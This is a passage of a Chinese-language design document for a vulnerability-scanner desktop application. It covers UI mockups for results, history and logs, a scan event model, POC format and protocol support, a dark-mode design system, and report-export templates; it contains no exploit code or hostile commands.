│ │ 目标数量:   5                                              │  │
│ │ POC数量:    4,500                                          │  │
│ │ 扫描模式:   智能模式                                       │  │
│ │ 线程数:     20                                             │  │
│ │ 超时设置:   15秒                                           │  │
│ │ 重试次数:   2                                              │  │
│ │ POC格式:    Nuclei, Xray, Goby                            │  │
│ │ 严重程度:   Critical, High, Medium                         │  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│ ┌─ 扫描结果 ────────────────────────────────────────────────┐  │
│ │ 发现漏洞:   100                                            │  │
│ │   🔴 Critical: 5                                           │  │
│ │   🟠 High:     12                                          │  │
│ │   🟡 Medium:   28                                          │  │
│ │   🔵 Low:      45                                          │  │
│ │   ⚪ Info:     10                                          │  │
│ │                                                            │  │
│ │ 扫描任务:   22,500 (5 targets × 4,500 POCs)               │  │
│ │ 已完成:     22,500                                         │  │
│ │ 成功率:     99.8%                                          │  │
│ │ 平均响应:   245ms                                          │  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│ ┌─ 目标列表 ────────────────────────────────────────────────┐  │
│ │ • https://example.com       → 发现 45 个漏洞               │  │
│ │ • https://test.org          → 发现 32 个漏洞               │  │
│ │ • https://demo.net          → 发现 15 个漏洞               │  │
│ │ • https://sample.io         → 发现 8 个漏洞                │  │
│ │ • 192.168.1.100:8080        → 发现 0 个漏洞                │  │
│ └───────────────────────────────────────────────────────────┘  │
│                                                                  │
│                          [关闭]                                  │
└─────────────────────────────────────────────────────────────────┘
```

#### 4.6.3 历史清理

```
┌─────────────────────────────────────────────────────┐
│ 清理历史记录                           [×] 关闭      │
├─────────────────────────────────────────────────────┤
│                                                      │
│ 清理条件:                                            │
│ ◉ 按时间清理                                         │
│   清理早于: [30天前 ▼]                              │
│                                                      │
│ ○ 按状态清理                                         │
│   [☑] 已完成  [☑] 失败  [☐] 暂停                    │
│                                                      │
│ ○ 按结果清理                                         │
│   [☑] 无漏洞的扫描记录                               │
│   [☐] 漏洞数少于 [5] 个的记录                       │
│                                                      │
│ ┌─ 预览 ──────────────────────────────────────────┐ │
│ │ 将清理记录数: 25                                 │ │
│ │ 将释放空间: 约 15 MB                             │ │
│ │                                                  │ │
│ │ [☑] 同时删除相关的扫描结果                       │ │
│ │ [☑] 同时删除相关的日志文件                       │ │
│ │ [☐] 创建备份后再删除                             │ │
│ └──────────────────────────────────────────────────┘ │
│                                                      │
│            [开始清理] [取消]                         │
└─────────────────────────────────────────────────────┘
```

### 4.7 日志查看器界面设计

#### 4.7.1 日志查看器主界面

```
┌─────────────────────────────────────────────────────────────────┐
│ 扫描日志查看器                                       [×] 关闭  │
├─────────────────────────────────────────────────────────────────┤
│ 日期: [2026-01-06 ▼]  级别: [全部 ▼]  类别: [全部 ▼]          │
│ 搜索: [__________________]  [搜索]  [清空日志]  [导出]         │
│                                                                  │
│ ┌─ 日志内容 ────────────────────────────────────────────────┐  │
│ │ [10:30:15] [INFO] [SYSTEM] 扫描模块初始化完成              │  │
│ │ [10:30:16] [INFO] [SCAN] 开始扫描，目标数: 5，POC数: 4500  │  │
│ │ [10:30:17] [DEBUG] [HTTP] 发送请求: GET https://example... │  │
│ │ [10:30:17] [INFO] [HTTP] 响应状态: 200 OK (245ms)          │  │
│ │ [10:30:18] [SUCCESS] [SCAN] 发现漏洞: CVE-2021-44228      │  │
│ │ [10:30:19] [WARN] [HTTP] 请求超时: https://test.org/api.. │  │
│ │ [10:30:20] [INFO] [SCAN] 进度: 150/22500 (0.67%)          │  │
│ │ [10:30:25] [ERROR] [HTTP] 连接失败: Connection refused    │  │
│ │ [10:30:30] [INFO] [SCAN] 进度: 300/22500 (1.33%)          │  │
│ │ [10:35:47] [INFO] [SCAN] 扫描完成，发现漏洞: 100 个        │  │
│ │ ...                                                         │  │
│ │ [自动滚动到底部]                                            │  │
│ └───────────────────────────────────────────────────────────┘  │
│ 共 1,234 条日志  [1][2][3]...[124]  每页: [10▼]  [☑] 自动滚动│
│                                                                  │
│ ┌─ 统计信息 ────────────────────────────────────────────────┐  │
│ │ DEBUG: 450  INFO: 678  WARN: 89  ERROR: 15  SUCCESS: 2    │  │
│ └───────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

**日志查看器控件说明：**

| 控件ID | 类型 | 功能 |
|--------|------|------|
| `logDatePicker` | DatePicker | 日期选择器 |
| `logLevelFilter` | ComboBox | 日志级别过滤 |
| `logCategoryFilter` | ComboBox | 日志类别过滤 |
| `logSearchField` | TextField | 日志搜索框 |
| `logTextArea` | TextArea | 日志显示区域 |
| `logClearButton` | Button | 清空日志 |
| `logExportButton` | Button | 导出日志 |
| `logAutoScrollCheckBox` | CheckBox | 自动滚动开关 |
| `logStatsLabel` | Label | 日志统计信息 |

#### 4.7.2 日志筛选器

```
┌─────────────────────────────────────────────────────┐
│ 高级筛选                               [×] 关闭      │
├─────────────────────────────────────────────────────┤
│                                                      │
│ 日志级别:                                            │
│ [☑] DEBUG  [☑] INFO  [☑] WARN  [☑] ERROR  [☑] SUCCESS│
│                                                      │
│ 日志类别:                                            │
│ [☑] SYSTEM  [☑] SCAN  [☑] HTTP  [☑] DNS  [☑] TCP   │
│                                                      │
│ 时间范围:                                            │
│ 开始: [2026-01-06 10:00:00]                         │
│ 结束: [2026-01-06 11:00:00]                         │
│                                                      │
│ 关键词:                                              │
│ 包含: [_______________________________]             │
│ 排除: [_______________________________]             │
│                                                      │
│ 高级选项:                                            │
│ [☐] 仅显示错误日志                                   │
│ [☐] 仅显示漏洞发现日志                               │
│ [☐] 显示详细堆栈信息                                 │
│                                                      │
│            [应用筛选] [重置] [取消]                  │
└─────────────────────────────────────────────────────┘
```

#### 4.7.3 日志导出

```
┌─────────────────────────────────────────────────────┐
│ 导出日志                               [×] 关闭      │
├─────────────────────────────────────────────────────┤
│                                                      │
│ 导出格式:                                            │
│ ◉ 文本文件 (.txt)                                    │
│ ○ CSV表格 (.csv)                                     │
│ ○ JSON数据 (.json)                                   │
│ ○ HTML网页 (.html)                                   │
│                                                      │
│ 导出范围:                                            │
│ ◉ 当前筛选结果 (1,234 条)                           │
│ ○ 全部日志 (5,678 条)                               │
│ ○ 选中日期范围                                       │
│                                                      │
│ 导出选项:                                            │
│ [☑] 包含时间戳                                       │
│ [☑] 包含日志级别                                     │
│ [☑] 包含日志类别                                     │
│ [☐] 包含线程信息                                     │
│ [☐] 包含堆栈跟踪                                     │
│                                                      │
│ 保存路径:                                            │
│ [/Users/potato/Desktop/logs/______]  [浏览...]           │
│                                                      │
│            [开始导出] [取消]                         │
└─────────────────────────────────────────────────────┘
```

---

## 5. 事件系统

### 5.1 事件类型

```java
public enum ScanEventType {
    SCAN_STARTED,           // 扫描开始
    SCAN_COMPLETED,         // 扫描完成
    SCAN_CANCELLED,         // 扫描取消
    SCAN_ERROR,             // 扫描错误
    TARGET_STARTED,         // 目标开始
    TARGET_COMPLETED,       // 目标完成
    FINGERPRINT_STARTED,    // 指纹识别开始
    FINGERPRINT_COMPLETED,  // 指纹识别完成
    DEDUPLICATION,          // 去重完成
    POC_SCAN_STARTED,       // POC 扫描开始
    POC_SCAN_COMPLETED,     // POC 扫描完成
    POC_ERROR,              // POC 执行错误
    VULNERABILITY_FOUND,    // 发现漏洞
    PROGRESS,               // 进度更新
    INFO,                   // 信息
    WARNING                 // 警告
}
```

### 5.2 事件监听

```java
// 添加监听器
scanService.addEventListener(event -> {
    switch (event.getType()) {
        case VULNERABILITY_FOUND:
            // 更新 UI 显示漏洞
            break;
        case PROGRESS:
            // 更新进度条
            break;
        // ...
    }
});
```

---

## 6. POC 格式支持

### 6.1 支持的格式

| 格式 | 转换器 | 特点 |
|------|--------|------|
| Nuclei | NucleiPocConverter | 功能最全，支持多协议 |
| Goby | GobyPocConverter | 国产，中文支持好 |
| Xray | XrayPocConverter | 规则简洁 |
| Pocsuite | PocsuitePocConverter | Python 脚本格式 |

### 6.2 协议支持

| 协议 | 步骤类 | 说明 |
|------|--------|------|
| HTTP | PocStep | 标准 HTTP 请求 |
| TCP | TcpStep | TCP 连接扫描 |
| UDP | - | UDP 协议 |
| DNS | DnsStep | DNS 查询 |
| SSL | SslStep | SSL/TLS 检测 |
| File | FileStep | 本地文件扫描 |
| Headless | HeadlessStep | 浏览器自动化 |
| Code | CodeStep | 代码执行 |

---

## 7. 使用示例

### 7.1 智能模式扫描

```java
// 1. 创建组件
PocRepository pocRepository = new PocRepository();
PocExecutor pocExecutor = new PocExecutor();

// 2. 加载 POC
pocRepository.loadDirectory("poc");

// 3. 配置扫描
ScanConfig config = new ScanConfig();
config.setScanMode(ScanMode.SMART);
config.setSkipFingerprint(false);
config.setEnableDeduplication(true);
config.setEnableResponseCache(true);

// 4. 执行扫描
UnifiedVulnScanService service = new UnifiedVulnScanService(pocRepository, pocExecutor);
service.addEventListener(event -> System.out.println(event));

List<ScanResult> results = service.scan(Arrays.asList("https://target.com"), config);

// 5. 处理结果
results.stream()
    .filter(ScanResult::isVulnerable)
    .forEach(r -> System.out.println("漏洞: " + r.getPoc().getName()));
```

---

## 8. 性能指标

| 指标 | 默认模式 | 智能模式（优化后） |
|------|----------|-------------------|
| POC 执行数 | 100% | 30-50%（去重后） |
| HTTP 请求数 | 100% | 20-40%（聚类后） |
| 扫描耗时 | 基准 | 降低 50-70% |
| 误报率 | 较高 | 降低（精准匹配） |

---

## 9. 后续规划

- [ ] 分布式扫描支持
- [ ] 更多 POC 格式（YAML 自定义）
- [ ] 漏洞验证链（多步骤关联）
- [x] 报告模板定制 - **已完成增强版设计**
- [ ] 与资产管理联动

---

## 9.5. UI/UX 设计系统增强 (2025-01-06)

### 9.5.1 设计理念

基于专业网络安全工具的最佳实践，采用 **Dark Mode (OLED) + Minimalism** 设计系统，提供：
- 低眼疲劳的深色主题
- 高对比度的专业配色
- 清晰的信息层级
- 流畅的交互体验
- 完整的可访问性支持

### 9.5.2 颜色系统 (Color Palette)

#### 基础颜色 - Dark Mode
| 用途 | 变量名 | 颜色值 | 说明 |
|------|--------|--------|------|
| 基础黑色 | `-fx-base-black` | `#000000` | OLED 纯黑 |
| 暗色背景 | `-fx-base-dark` | `#0A0E27` | 午夜蓝 |
| 更暗背景 | `-fx-base-darker` | `#121212` | 深灰 |
| 表面背景 | `-fx-base-surface` | `#1A1D2E` | 表面层 |
| 提升表面 | `-fx-base-elevated` | `#22264D` | 提升层 |

#### 文字颜色 - 高对比度
| 用途 | 变量名 | 颜色值 | 对比度 |
|------|--------|--------|--------|
| 主要文字 | `-fx-text-primary` | `#F8FAFC` | AAA |
| 次要文字 | `-fx-text-secondary` | `#CBD5E1` | AAA |
| 弱化文字 | `-fx-text-muted` | `#94A3B8` | AA |
| 禁用文字 | `-fx-text-disabled` | `#64748B` | AA |

#### 强调色 - 蓝色聚焦
| 用途 | 变量名 | 颜色值 | 应用场景 |
|------|--------|--------|----------|
| 主色调 | `-fx-primary` | `#3B82F6` | 按钮、链接、焦点 |
| 主色悬停 | `-fx-primary-hover` | `#2563EB` | 交互状态 |
| 主色激活 | `-fx-primary-active` | `#1D4ED8` | 按下状态 |
| 主色光晕 | `-fx-primary-glow` | `rgba(59, 130, 246, 0.3)` | 阴影效果 |

#### 严重度配色 - 专业安全色板
| 等级 | 颜色 | 背景色 | 使用场景 |
|------|------|--------|----------|
| **Critical** | `#DC2626` | `rgba(220, 38, 38, 0.15)` | 严重漏洞 |
| **High** | `#EA580C` | `rgba(234, 88, 12, 0.15)` | 高危漏洞 |
| **Medium** | `#F59E0B` | `rgba(245, 158, 11, 0.15)` | 中危漏洞 |
| **Low** | `#3B82F6` | `rgba(59, 130, 246, 0.15)` | 低危漏洞 |
| **Info** | `#6B7280` | `rgba(107, 114, 128, 0.15)` | 信息提示 |

#### POC 格式配色
| 格式 | 颜色 | 说明 |
|------|------|------|
| Nuclei | `#00B8D9` | 青色 |
| Goby | `#FF5630` | 红色 |
| Xray | `#6554C0` | 紫色 |
| Pocsuite | `#36B37E` | 绿色 |

### 9.5.3 间距系统 (Spacing Scale)

基于 **8px 基准**的间距体系：

| 名称 | 值 | 使用场景 |
|------|-----|----------|
| xs | 4px | 最小间距 |
| sm | 8px | 紧凑间距 |
| md | 12px | 标准间距 |
| lg | 16px | 舒适间距 |
| xl | 24px | 大间距 |
| 2xl | 32px | 区块间距 |

### 9.5.4 圆角系统 (Border Radius)

| 名称 | 值 | 应用组件 |
|------|-----|----------|
| sm | 4px | 小组件（标签、输入框） |
| md | 6px | 按钮、卡片边缘 |
| lg | 8px | 大卡片、面板 |
| xl | 12px | 弹窗、对话框 |
| full | 9999px | 圆形按钮、徽章 |

### 9.5.5 阴影系统 (Shadows)

| 级别 | 定义 | 使用场景 |
|------|------|----------|
| sm | `dropshadow(gaussian, rgba(0,0,0,0.1), 2, 0, 0, 1)` | 微妙提升 |
| md | `dropshadow(gaussian, rgba(0,0,0,0.2), 4, 0, 0, 2)` | 卡片 |
| lg | `dropshadow(gaussian, rgba(0,0,0,0.3), 8, 0, 0, 4)` | 弹窗 |
| glow | `dropshadow(gaussian, primary-glow, 12, 0, 0, 0)` | 焦点效果 |

### 9.5.6 字体系统 (Typography)

#### 字体族
- **主字体**: `"Microsoft YaHei", "PingFang SC", "Segoe UI", system-ui, sans-serif`
- **等宽字体**: `"JetBrains Mono", "Consolas", "Courier New", monospace`

#### 字体大小
| 名称 | 大小 | 应用 |
|------|------|------|
| xs | 11px | 标签、提示 |
| sm | 12px | 辅助文字 |
| base | 14px | 正文 |
| lg | 16px | 小标题 |
| xl | 18px | 副标题 |
| 2xl | 20px | 主标题 |
| 3xl | 24px | 大标题 |

#### 字重
| 名称 | 值 | 使用 |
|------|-----|------|
| normal | 400 | 正文 |
| medium | 500 | 强调 |
| semibold | 600 | 次标题 |
| bold | 700 | 主标题 |

### 9.5.7 动画时长 (Animation Timing)

遵循 **ease-out** 缓动函数：

| 名称 | 时长 | 使用场景 |
|------|------|----------|
| fast | 150ms | 快速反馈（按钮悬停） |
| base | 200ms | 标准过渡（面板展开） |
| slow | 300ms | 慢速过渡（弹窗出现） |

### 9.5.8 组件样式规范

#### 按钮组件
```css
/* 主按钮 */
.primary-button {
    background: #3B82F6;
    color: white;
    padding: 8px 16px;
    border-radius: 6px;
    transition: all 200ms ease-out;
}
.primary-button:hover {
    background: #2563EB;
    box-shadow: 0 0 20px rgba(59, 130, 246, 0.3);
}

/* 次要按钮 */
.secondary-button {
    background: transparent;
    border: 1px solid #475569;
    color: #F8FAFC;
}
```

#### 卡片组件
```css
.result-item-pane {
    background: #1A1D2E;
    border: 1px solid #334155;
    border-left: 4px solid var(--severity-color);
    border-radius: 8px;
    padding: 16px;
    transition: all 200ms ease-out;
}
.result-item-pane:hover {
    border-color: #3B82F6;
    box-shadow: 0 0 20px rgba(59, 130, 246, 0.3);
    transform: translateX(4px);
}
```

### 9.5.9 响应式设计

#### 断点系统
| 断点 | 宽度 | 设备 |
|------|------|------|
| mobile | < 768px | 手机 |
| tablet | 768px - 1024px | 平板 |
| desktop | > 1024px | 桌面 |

### 9.5.10 可访问性 (Accessibility)

#### 对比度要求
- 所有文字对比度 **≥ 4.5:1** (WCAG AA)
- 大字体对比度 **≥ 3:1** (WCAG AA)
- 关键信息对比度 **≥ 7:1** (WCAG AAA)

#### 焦点指示
- 所有交互元素必须有明显的焦点环
- 焦点环颜色: `#3B82F6`, 宽度: `2px`, 偏移: `2px`

#### 动画支持
- 检测 `prefers-reduced-motion` 媒体查询
- 用户禁用动画时，关闭所有过渡效果

---

## 9.6. 增强版报告模板设计 (2025-01-06)

### 9.6.1 HTML 报告增强

#### 文件位置
`src/main/resources/templates/report-template-enhanced.html`

#### 核心特性

**1. 专业暗色主题**
- 采用与应用一致的 Dark Mode (OLED) 配色
- 高对比度文字，降低眼疲劳
- 专业的渐变和阴影效果

**2. 交互式过滤与搜索**
```javascript
// 按严重度过滤
function filterBySeverity(severity) {
    // 动态显示/隐藏漏洞项
}

// 实时搜索
function searchVulns() {
    // 关键词匹配过滤
}
```

**3. 统计仪表板**
- 9 个统计卡片（目标数、POC数、漏洞总数、各严重度统计）
- 悬停动画效果
- 颜色编码的严重度指示

**4. 漏洞详情卡片**
```html
<div class="vuln-item critical">
    <div class="vuln-header">
        <div class="vuln-title">
            漏洞名称
            <span class="severity-badge critical">CRITICAL</span>
        </div>
    </div>
    <div class="vuln-meta">
        <div>🎯 目标: example.com</div>
        <div>🔖 POC ID: CVE-2021-44228</div>
    </div>
    <div class="detail-section">
        <h4>📤 HTTP请求</h4>
        <pre class="code-block">...</pre>
    </div>
</div>
```

**5. 代码块语法**
- 暗色背景 (#121212)
- 等宽字体 (JetBrains Mono)
- 自定义滚动条样式
- 最大高度限制 (400px)

**6. 响应式布局**
- 移动端优化 (< 768px)
- 平板适配 (768px - 1024px)
- 打印友好样式

**7. 快捷键支持**
- `Ctrl/Cmd + P`: 打印报告
- 实时搜索

#### 模板变量占位符
| 占位符 | 说明 | 示例值 |
|--------|------|--------|
| `{{REPORT_DATE}}` | 报告生成日期 | 2025-01-06 10:30:15 |
| `{{SCAN_DURATION}}` | 扫描耗时 | 05分32秒 |
| `{{TARGET_COUNT}}` | 目标数量 | 5 |
| `{{POC_COUNT}}` | POC数量 | 4500 |
| `{{VULN_COUNT}}` | 漏洞总数 | 100 |
| `{{CRITICAL_COUNT}}` | 严重漏洞数 | 5 |
| `{{SEVERITY_CRITICAL}}` | Critical级别数量 | 5 |
| `{{SEVERITY_HIGH}}` | High级别数量 | 12 |
| `{{SEVERITY_MEDIUM}}` | Medium级别数量 | 28 |
| `{{SEVERITY_LOW}}` | Low级别数量 | 45 |
| `{{SEVERITY_INFO}}` | Info级别数量 | 10 |
| `{{VULNERABILITY_LIST}}` | 漏洞详情HTML | (动态生成) |

### 9.6.2 Word 报告样式增强

#### 推荐样式配置
使用 Apache POI 生成 Word 文档时，应用以下样式：

**文档级别样式**
| 元素 | 字体 | 字号 | 颜色 |
|------|------|------|------|
| 标题1 | Microsoft YaHei Bold | 24pt | #3B82F6 |
| 标题2 | Microsoft YaHei Bold | 20pt | #475569 |
| 标题3 | Microsoft YaHei Bold | 16pt | #64748B |
| 正文 | Microsoft YaHei | 11pt | #1E293B |
| 代码 | Consolas | 10pt | #2D2D2D |

**严重度标签样式**
| 等级 | 背景色 | 文字色 | 边框 |
|------|--------|--------|------|
| Critical | #DC2626 | #FFFFFF | 无 |
| High | #EA580C | #FFFFFF | 无 |
| Medium | #F59E0B | #000000 | 无 |
| Low | #3B82F6 | #FFFFFF | 无 |
| Info | #6B7280 | #FFFFFF | 无 |

**表格样式**
- 表头背景: `#F1F5F9`
- 表头文字: `#1E293B`, 加粗
- 单元格边框: `#CBD5E1`, 1pt
- 交替行背景: `#F8FAFC`

### 9.6.3 Excel 报告样式增强

#### 工作表结构
1. **概览 (Overview)**
   - 扫描统计汇总
   - 饼图（严重度分布）
   - 柱状图（分类统计）

2. **漏洞列表 (Vulnerabilities)**
   - 完整漏洞数据表
   - 自动筛选器
   - 条件格式化

3. **统计分析 (Statistics)**
   - 数据透视表
   - 趋势分析

#### 单元格样式
| 内容类型 | 字体 | 大小 | 对齐 | 背景 |
|----------|------|------|------|------|
| 表头 | 黑体 | 12pt | 居中 | #3B82F6 |
| Critical | 宋体 | 11pt | 左对齐 | #FEF2F2 |
| High | 宋体 | 11pt | 左对齐 | #FFF7ED |
| Medium | 宋体 | 11pt | 左对齐 | #FFFBEB |
| Low | 宋体 | 11pt | 左对齐 | #EFF6FF |
| Info | 宋体 | 11pt | 左对齐 | #F9FAFB |

#### 条件格式规则
```java
// Apache POI 条件格式示例
ConditionalFormattingRule ruleCritical =
    sheetCF.createConditionalFormattingRule(ComparisonOperator.EQUAL, "\"CRITICAL\"");
PatternFormatting patternCritical = ruleCritical.createPatternFormatting();
patternCritical.setFillBackgroundColor(IndexedColors.RED.getIndex());
```

### 9.6.4 PDF 报告增强

#### 推荐库
使用 iText 7 或 Apache PDFBox 生成 PDF

#### 样式规范
- **页面大小**: A4 (210mm × 297mm)
- **边距**: 上下左右各 25mm
- **字体嵌入**: 确保中文显示正确
- **页眉**: 公司Logo + 报告标题
- **页脚**: 页码 + 生成时间

### 9.6.5 报告生成最佳实践

**性能优化**
1. 大数据量时分页处理
2. 图片压缩（< 500KB）
3. 异步生成，不阻塞UI

**安全考虑**
1. 敏感信息脱敏（IP地址、账号等）
2. 报告加密选项（ZIP密码保护）
3. 水印功能（标记报告所有者）

**用户体验**
1. 进度条显示生成进度
2. 生成完成后自动打开文件
3. 导出失败时显示详细错误信息

---

## 10. UI 功能点设计说明

### 10.1 控制器架构

**控制器类**: `PaneVulScan.java`

**服务层集成**:
- `VulnScanService` - 基础扫描服务（默认模式）
- `UnifiedVulnScanService` - 统一扫描服务（智能模式）
- `VulnScanDatabase` - 扫描历史存储
- `ReportGenerator` - 报告生成

### 10.2 UI 配置到后端映射

| UI 控件 | 配置字段 | 说明 |
|---------|----------|------|
| `threadsField` | `ScanConfig.threads` | 并发线程数 |
| `timeoutField` | `ScanConfig.timeout` | 请求超时（秒） |
| `retriesField` | `ScanConfig.retries` | 重试次数 |
| `nucleiCheckBox` | `ScanConfig.enabledPocFormats` | POC 格式筛选 |
| `gobyCheckBox` | `ScanConfig.enabledPocFormats` | POC 格式筛选 |
| `xrayCheckBox` | `ScanConfig.enabledPocFormats` | POC 格式筛选 |
| `pocsuiteCheckBox` | `ScanConfig.enabledPocFormats` | POC 格式筛选 |
| `severityCriticalBox` | `ScanConfig.severity` | 严重度过滤 |
| `severityHighBox` | `ScanConfig.severity` | 严重度过滤 |
| `severityMediumBox` | `ScanConfig.severity` | 严重度过滤 |
| `severityLowBox` | `ScanConfig.severity` | 严重度过滤 |
| `severityInfoBox` | `ScanConfig.severity` | 严重度过滤 |
| `scanModeComboBox` | `ScanConfig.scanMode` | 智能/默认模式 |
| `enableFingerprintBox` | `ScanConfig.skipFingerprint` | 指纹识别开关 |
| `enableDeduplicationBox` | `ScanConfig.enableDeduplication` | POC 去重 |
| `enableResponseCacheBox` | `ScanConfig.enableResponseCache` | 响应缓存 |
| `enableClusteringBox` | `ScanConfig.enableClustering` | 请求聚类 |
| `enableHeadlessBox` | `ScanConfig.enableHeadless` | Headless 模板 |
| `enableCodeBox` | `ScanConfig.enableCode` | Code 模板 |
| `enableFuzzBox` | `ScanConfig.enableFuzz` | Fuzz 模板 |
| `inputTypeComboBox` | `ScanConfig.inputType` | 输入类型 |
| `tagsField` | `ScanConfig.protocol` | 标签过滤 |
| `enableProxyBox` | `ScanConfig.proxy` | 代理设置 |
| `verboseLogBox` | `ScanConfig.debug` | 详细日志 |

### 10.3 扫描模式切换

```
┌─────────────────────────────────────────────────────────┐
│                    扫描模式选择                          │
├─────────────────────────────────────────────────────────┤
│  智能模式 (SMART)                                        │
│  ├── 使用 UnifiedVulnScanService                        │
│  ├── 执行指纹识别 → 精准匹配 POC                         │
│  ├── 支持 POC 去重、响应缓存、请求聚类                    │
│  └── 适用于生产环境扫描                                  │
│                                                          │
│  默认模式 (DEFAULT)                                      │
│  ├── 使用 VulnScanService                               │
│  ├── 跳过指纹识别，执行所有匹配 POC                      │
│  └── 适用于全面扫描                                      │
└─────────────────────────────────────────────────────────┘
```

### 10.4 已实现的 UI 功能

#### 扫描控制
- [x] 开始扫描（智能/默认模式自动切换）
- [x] 暂停/恢复扫描
- [x] 停止扫描
- [x] 扫描状态实时更新
- [x] 进度条和统计信息显示

#### POC 管理
- [x] POC 列表展示（支持搜索、过滤）
- [x] POC 详情查看
- [x] POC 启用/禁用
- [x] POC 导出为 YAML 文件
- [x] POC 在线更新
- [x] POC 批量导入

#### 扫描预设
- [x] 快速扫描预设（高线程、Critical/High）
- [x] 标准扫描预设（平衡配置）
- [x] 深度扫描预设（低线程、全级别）
- [x] 配置导入/导出（JSON 格式）

#### 结果展示
- [x] 漏洞列表实时更新
- [x] 漏洞严重度统计面板
- [x] 漏洞详情展示
- [x] 报告导出（HTML/Word/Excel/CSV/JSON）

#### 历史记录
- [x] 扫描历史查询（时间范围过滤）
- [x] 历史记录加载/删除
- [x] 历史记录导出（JSON/CSV/TXT）
- [x] 自动保存功能

#### 日志功能
- [x] 扫描日志实时记录
- [x] 日志查看器（支持级别过滤）
- [x] 日志导出
- [x] 旧日志清理

### 10.5 事件处理流程

```
┌─────────────────────────────────────────────────────────┐
│              UnifiedVulnScanService 事件                 │
├─────────────────────────────────────────────────────────┤
│  SCAN_STARTED      → updateScanStateLabel("扫描中...")   │
│  SCAN_COMPLETED    → updateScanStateLabel("已完成")      │
│                    → updateStatistics(results)          │
│  SCAN_CANCELLED    → updateScanStateLabel("已取消")      │
│  SCAN_ERROR        → showPrompt(errorMessage, true)     │
│  VULNERABILITY_FOUND → addVulnResultToUI(result)        │
│  PROGRESS          → progressBar.setProgress(...)       │
│  INFO/WARNING      → ScanLogger.info(...)               │
│  FINGERPRINT_*     → ScanLogger.info(...)               │
│  DEDUPLICATION     → ScanLogger.info(...)               │
│  POC_SCAN_*        → ScanLogger.info(...)               │
└─────────────────────────────────────────────────────────┘
```

### 10.6 FXML 结构

```
pane_vulScan.fxml
├── 目标输入区
│   ├── targetField (TextArea)
│   └── 上传/扫描按钮
├── POC 格式选择区
│   ├── nucleiCheckBox
│   ├── gobyCheckBox
│   ├── xrayCheckBox
│   └── pocsuiteCheckBox
├── 扫描选项区
│   ├── 严重度选择 (Critical/High/Medium/Low/Info)
│   ├── 代理/日志/自动保存选项
│   └── 高级参数 (线程/超时/重试/标签)
├── 智能扫描选项区
│   ├── scanModeComboBox (智能模式/默认模式)
│   ├── enableFingerprintBox
│   ├── enableDeduplicationBox
│   ├── enableResponseCacheBox
│   └── enableClusteringBox
├── 特殊模板选项区
│   ├── enableHeadlessBox
│   ├── enableCodeBox
│   ├── enableFuzzBox
│   └── inputTypeComboBox
├── POC 统计区
│   └── pocTotalLabel, pocNucleiLabel, ...
├── 进度显示区
│   ├── progressBar
│   ├── progressLabel
│   ├── statsLabel
│   └── timeLabel
├── 结果展示区
│   ├── resultVBox
│   ├── vulnCountLabel
│   └── exportFormatComboBox
├── 统计面板 (statsPane)
│   └── Critical/High/Medium/Low/Info 计数
└── 弹窗
    ├── POC 管理弹窗 (pocManageMask)
    ├── POC 详情弹窗 (pocDetailMask)
    ├── 日志查看弹窗 (logViewerMask)
    └── 历史记录弹窗 (historyMask)
```
